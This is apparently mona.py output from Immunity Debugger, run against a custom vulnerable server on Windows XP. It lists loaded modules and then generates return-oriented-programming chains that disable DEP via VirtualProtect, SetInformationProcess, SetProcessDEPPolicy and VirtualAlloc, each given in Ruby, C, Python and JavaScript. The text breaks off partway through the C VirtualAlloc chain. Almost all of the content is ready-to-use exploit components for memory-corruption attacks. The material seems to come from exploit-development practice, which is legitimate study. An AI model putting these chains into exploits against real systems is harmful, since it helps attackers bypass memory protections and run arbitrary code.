================================================================================
  Output generated by mona.py v2.0, rev 616 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : xp, release 5.1.2600
  Process being debugged : main (pid 916)
  Current mona arguments: rop -cpb "\x00" -m *.dll
================================================================================
  2022-03-28 01:02:12
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x73d90000 | 0x73db7000 | 0x00027000 | False  | False   | False |  False   | True   | 4.00 [CRTDLL.DLL] (C:\WINDOWS\system32\CRTDLL.DLL)
 0x00400000 | 0x0040d000 | 0x0000d000 | False  | False   | False |  False   | False  | -1.0- [main.exe] (Z:\exploits\custom_vulnserver\custom_vulnserver\main.exe)
 0x77f10000 | 0x77f59000 | 0x00049000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [GDI32.dll] (C:\WINDOWS\system32\GDI32.dll)
 0x77dd0000 | 0x77e6b000 | 0x0009b000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ADVAPI32.dll] (C:\WINDOWS\system32\ADVAPI32.dll)
 0x7c800000 | 0x7c8f6000 | 0x000f6000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
 0x77c10000 | 0x77c68000 | 0x00058000 | False  | True    | False |  False   | True   | 7.0.2600.5512 [msvcrt.dll] (C:\WINDOWS\system32\msvcrt.dll)
 0x77fe0000 | 0x77ff1000 | 0x00011000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [Secur32.dll] (C:\WINDOWS\system32\Secur32.dll)
 0x7c900000 | 0x7c9af000 | 0x000af000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ntdll.dll] (C:\WINDOWS\system32\ntdll.dll)
 0x71aa0000 | 0x71aa8000 | 0x00008000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [WS2HELP.dll] (C:\WINDOWS\system32\WS2HELP.dll)
 0x77e70000 | 0x77f02000 | 0x00092000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [RPCRT4.dll] (C:\WINDOWS\system32\RPCRT4.dll)
 0x71ab0000 | 0x71ac7000 | 0x00017000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [WS2_32.DLL] (C:\WINDOWS\system32\WS2_32.DLL)
 0x7e410000 | 0x7e4a1000 | 0x00091000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [USER32.DLL] (C:\WINDOWS\system32\USER32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
      0x77e82d1c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x77f53564,  # XCHG EAX,ESI # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c3ed76,  # POP EBP # RETN [msvcrt.dll] 
      0x77def049,  # & jmp esp [ADVAPI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77ebad22,  # POP EAX # RETN [RPCRT4.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77dd9b06,  # NEG EAX # RETN [ADVAPI32.dll] 
      0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7c87f318,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x73da468c,  # NEG EAX # RETN [CRTDLL.DLL] 
      0x77f124c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c40e0c,  # POP ECX # RETN [msvcrt.dll] 
      0x7e471c47,  # &Writable location [USER32.DLL]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c46116,  # POP EDI # RETN [msvcrt.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x77c4ded4,  // POP EAX // RETN [msvcrt.dll] 
      0x77c11120,  // ptr to &VirtualProtect() [IAT msvcrt.dll]
      0x77e82d1c,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [RPCRT4.dll] 
      0x77f53564,  // XCHG EAX,ESI // RETN [GDI32.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x77c3ed76,  // POP EBP // RETN [msvcrt.dll] 
      0x77def049,  // & jmp esp [ADVAPI32.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77ebad22,  // POP EAX // RETN [RPCRT4.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x77dd9b06,  // NEG EAX // RETN [ADVAPI32.dll] 
      0x77f301e4,  // XCHG EAX,EBX // RETN [GDI32.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x7c87f318,  // POP EAX // RETN [kernel32.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x73da468c,  // NEG EAX // RETN [CRTDLL.DLL] 
      0x77f124c8,  // XCHG EAX,EDX // RETN [GDI32.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77c40e0c,  // POP ECX // RETN [msvcrt.dll] 
      0x7e471c47,  // &Writable location [USER32.DLL]
      //[---INFO:gadgets_to_set_edi:---]
      0x77c46116,  // POP EDI // RETN [msvcrt.dll] 
      0x77e8d224,  // RETN (ROP NOP) [RPCRT4.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  // POP EAX // RETN [kernel32.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x77c12df9,  // PUSHAD // RETN [msvcrt.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
      0x77e82d1c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x77f53564,  # XCHG EAX,ESI # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c3ed76,  # POP EBP # RETN [msvcrt.dll] 
      0x77def049,  # & jmp esp [ADVAPI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77ebad22,  # POP EAX # RETN [RPCRT4.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77dd9b06,  # NEG EAX # RETN [ADVAPI32.dll] 
      0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7c87f318,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x73da468c,  # NEG EAX # RETN [CRTDLL.DLL] 
      0x77f124c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c40e0c,  # POP ECX # RETN [msvcrt.dll] 
      0x7e471c47,  # &Writable location [USER32.DLL]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c46116,  # POP EDI # RETN [msvcrt.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uded4%u77c4" + // 0x77c4ded4 : ,# POP EAX # RETN [msvcrt.dll] 
    "%u1120%u77c1" + // 0x77c11120 : ,# ptr to &VirtualProtect() [IAT msvcrt.dll]
    "%u2d1c%u77e8" + // 0x77e82d1c : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
    "%u3564%u77f5" + // 0x77f53564 : ,# XCHG EAX,ESI # RETN [GDI32.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ued76%u77c3" + // 0x77c3ed76 : ,# POP EBP # RETN [msvcrt.dll] 
    "%uf049%u77de" + // 0x77def049 : ,# & jmp esp [ADVAPI32.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%uad22%u77eb" + // 0x77ebad22 : ,# POP EAX # RETN [RPCRT4.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u9b06%u77dd" + // 0x77dd9b06 : ,# NEG EAX # RETN [ADVAPI32.dll] 
    "%u01e4%u77f3" + // 0x77f301e4 : ,# XCHG EAX,EBX # RETN [GDI32.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%uf318%u7c87" + // 0x7c87f318 : ,# POP EAX # RETN [kernel32.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u468c%u73da" + // 0x73da468c : ,# NEG EAX # RETN [CRTDLL.DLL] 
    "%u24c8%u77f1" + // 0x77f124c8 : ,# XCHG EAX,EDX # RETN [GDI32.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u0e0c%u77c4" + // 0x77c40e0c : ,# POP ECX # RETN [msvcrt.dll] 
    "%u1c47%u7e47" + // 0x7e471c47 : ,# &Writable location [USER32.DLL]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u6116%u77c4" + // 0x77c46116 : ,# POP EDI # RETN [msvcrt.dll] 
    "%ud224%u77e8" + // 0x77e8d224 : ,# RETN (ROP NOP) [RPCRT4.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u0176%u7c88" + // 0x7c880176 : ,# POP EAX # RETN [kernel32.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u2df9%u77c1" + // 0x77c12df9 : ,# PUSHAD # RETN [msvcrt.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c521ee,  # POP ECX # RETN [msvcrt.dll] 
      0x77dd1404,  # ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
      0x7e45373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
      0x77e8392e,  # XCHG EAX,EBP # RETN [RPCRT4.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x77e8c784,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x73d911dc,  # &0x00000002 [CRTDLL.DLL]
      #[---INFO:gadgets_to_set_ebx:---]
      0x73d995f9,  # POP EBX # RETN [CRTDLL.DLL] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x73da468c,  # NEG EAX # RETN [CRTDLL.DLL] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c902563,  # POP EDI # RETN [ntdll.dll] 
      0x7c902563,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x7e423ad9,  # PUSHAD # RETN [USER32.DLL] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x77c521ee,  // POP ECX // RETN [msvcrt.dll] 
      0x77dd1404,  // ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
      0x7e45373d,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [USER32.DLL] 
      0x77e8392e,  // XCHG EAX,EBP // RETN [RPCRT4.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x77c4ded4,  // POP EAX // RETN [msvcrt.dll] 
      0xffffffde,  // Value to negate, will become 0x00000022
      0x77e8c784,  // NEG EAX // RETN [RPCRT4.dll] 
      0x77c58fbc,  // XCHG EAX,EDX // RETN [msvcrt.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77c42ebc,  // POP ECX // RETN [msvcrt.dll] 
      0x73d911dc,  // &0x00000002 [CRTDLL.DLL]
      //[---INFO:gadgets_to_set_ebx:---]
      0x73d995f9,  // POP EBX // RETN [CRTDLL.DLL] 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  // POP EAX // RETN [kernel32.dll] 
      0xfffffffc,  // Value to negate, will become 0x00000004
      0x73da468c,  // NEG EAX // RETN [CRTDLL.DLL] 
      //[---INFO:gadgets_to_set_edi:---]
      0x7c902563,  // POP EDI // RETN [ntdll.dll] 
      0x7c902563,  // skip 4 bytes [ntdll.dll]
      //[---INFO:pushad:---]
      0x7e423ad9,  // PUSHAD // RETN [USER32.DLL] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c521ee,  # POP ECX # RETN [msvcrt.dll] 
      0x77dd1404,  # ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
      0x7e45373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
      0x77e8392e,  # XCHG EAX,EBP # RETN [RPCRT4.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x77e8c784,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x73d911dc,  # &0x00000002 [CRTDLL.DLL]
      #[---INFO:gadgets_to_set_ebx:---]
      0x73d995f9,  # POP EBX # RETN [CRTDLL.DLL] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x73da468c,  # NEG EAX # RETN [CRTDLL.DLL] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c902563,  # POP EDI # RETN [ntdll.dll] 
      0x7c902563,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x7e423ad9,  # PUSHAD # RETN [USER32.DLL] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u21ee%u77c5" + // 0x77c521ee : ,# POP ECX # RETN [msvcrt.dll] 
    "%u1404%u77dd" + // 0x77dd1404 : ,# ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
    "%u373d%u7e45" + // 0x7e45373d : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
    "%u392e%u77e8" + // 0x77e8392e : ,# XCHG EAX,EBP # RETN [RPCRT4.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%uded4%u77c4" + // 0x77c4ded4 : ,# POP EAX # RETN [msvcrt.dll] 
    "%uffde%uffff" + // 0xffffffde : ,# Value to negate, will become 0x00000022
    "%uc784%u77e8" + // 0x77e8c784 : ,# NEG EAX # RETN [RPCRT4.dll] 
    "%u8fbc%u77c5" + // 0x77c58fbc : ,# XCHG EAX,EDX # RETN [msvcrt.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u2ebc%u77c4" + // 0x77c42ebc : ,# POP ECX # RETN [msvcrt.dll] 
    "%u11dc%u73d9" + // 0x73d911dc : ,# &0x00000002 [CRTDLL.DLL]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u95f9%u73d9" + // 0x73d995f9 : ,# POP EBX # RETN [CRTDLL.DLL] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u0176%u7c88" + // 0x7c880176 : ,# POP EAX # RETN [kernel32.dll] 
    "%ufffc%uffff" + // 0xfffffffc : ,# Value to negate, will become 0x00000004
    "%u468c%u73da" + // 0x73da468c : ,# NEG EAX # RETN [CRTDLL.DLL] 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u2563%u7c90" + // 0x7c902563 : ,# POP EDI # RETN [ntdll.dll] 
    "%u2563%u7c90" + // 0x7c902563 : ,# skip 4 bytes [ntdll.dll]
    "" + // #[---INFO:pushad:---] : 
    "%u3ad9%u7e42" + // 0x7e423ad9 : ,# PUSHAD # RETN [USER32.DLL] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x73d948cc,  # POP EBP # RETN [CRTDLL.DLL] 
      0x7c862144,  # SetProcessDEPPolicy() [kernel32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x73d9fbe3,  # POP EBX # RETN [CRTDLL.DLL] 
      0x73d91004,  # &0x00000000 [CRTDLL.DLL]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c4611e,  # POP EDI # RETN [msvcrt.dll] 
      0x77c4611e,  # skip 4 bytes [msvcrt.dll]
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x73d948cc,  // POP EBP // RETN [CRTDLL.DLL] 
      0x7c862144,  // SetProcessDEPPolicy() [kernel32.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x73d9fbe3,  // POP EBX // RETN [CRTDLL.DLL] 
      0x73d91004,  // &0x00000000 [CRTDLL.DLL]
      //[---INFO:gadgets_to_set_edi:---]
      0x77c4611e,  // POP EDI // RETN [msvcrt.dll] 
      0x77c4611e,  // skip 4 bytes [msvcrt.dll]
      //[---INFO:pushad:---]
      0x77c12df9,  // PUSHAD // RETN [msvcrt.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x73d948cc,  # POP EBP # RETN [CRTDLL.DLL] 
      0x7c862144,  # SetProcessDEPPolicy() [kernel32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x73d9fbe3,  # POP EBX # RETN [CRTDLL.DLL] 
      0x73d91004,  # &0x00000000 [CRTDLL.DLL]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c4611e,  # POP EDI # RETN [msvcrt.dll] 
      0x77c4611e,  # skip 4 bytes [msvcrt.dll]
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u48cc%u73d9" + // 0x73d948cc : ,# POP EBP # RETN [CRTDLL.DLL] 
    "%u2144%u7c86" + // 0x7c862144 : ,# SetProcessDEPPolicy() [kernel32.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ufbe3%u73d9" + // 0x73d9fbe3 : ,# POP EBX # RETN [CRTDLL.DLL] 
    "%u1004%u73d9" + // 0x73d91004 : ,# &0x00000000 [CRTDLL.DLL]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u611e%u77c4" + // 0x77c4611e : ,# POP EDI # RETN [msvcrt.dll] 
    "%u611e%u77c4" + // 0x77c4611e : ,# skip 4 bytes [msvcrt.dll]
    "" + // #[---INFO:pushad:---] : 
    "%u2df9%u77c1" + // 0x77c12df9 : ,# PUSHAD # RETN [msvcrt.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x77dd121c,  # ptr to &VirtualAlloc() [IAT ADVAPI32.dll]
      0x7e45615d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
      0x7c94d192,  # XCHG EAX,ESI # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c53113,  # POP EBP # RETN [msvcrt.dll] 
      0x77f31d2f,  # & jmp esp [GDI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x77e8d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77df560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77c4e392,  # POP EAX # RETN [msvcrt.dll] 
      0xa2800fc0,  # put delta into eax (-> put 0x00001000 into edx)
      0x7c87fa01,  # ADD EAX,5D800040 # RETN 0x04 [kernel32.dll] 
      0x77f124c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x77eed7a5,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77eda3d7,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c13ffd,  # XCHG EAX,ECX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90e7db,  # POP EDI # RETN [ntdll.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c87f318,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77e33da2,  # PUSHAD # RETN [ADVAPI32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x77c42ebc,  // POP ECX // RETN [msvcrt.dll] 
      0x77dd121c,  // ptr to &VirtualAlloc() [IAT ADVAPI32.dll]
      0x7e45615d,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [USER32.DLL] 
      0x7c94d192,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x77c53113,  // POP EBP // RETN [msvcrt.dll] 
      0x77f31d2f,  // & jmp esp [GDI32.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77c3b860,  // POP EAX // RETN [msvcrt.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x77e8d222,  // NEG EAX // RETN [RPCRT4.dll] 
      0x77df560a,  // XCHG EAX,EBX // RETN [ADVAPI32.dll] 
      //[---INFO:gadgets_to_set_edx:---]
